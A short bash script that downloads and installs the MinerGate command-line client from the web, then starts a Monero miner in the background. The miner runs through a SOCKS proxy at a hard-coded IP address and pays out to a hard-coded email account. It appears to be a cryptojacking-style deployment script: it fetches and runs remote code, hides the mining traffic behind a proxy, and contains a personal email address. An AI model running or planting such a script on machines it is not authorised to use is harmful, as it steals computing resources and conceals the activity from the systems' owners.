#!/bin/bash


apt-get update && apt-get -y install wget screen && wget https://minergate.com/download/deb-cli && dpkg -i deb-cli && minergate-cli -proxy socks://62.21.1.107:30939 -user sintraduciendo@gmail.com -xmr &
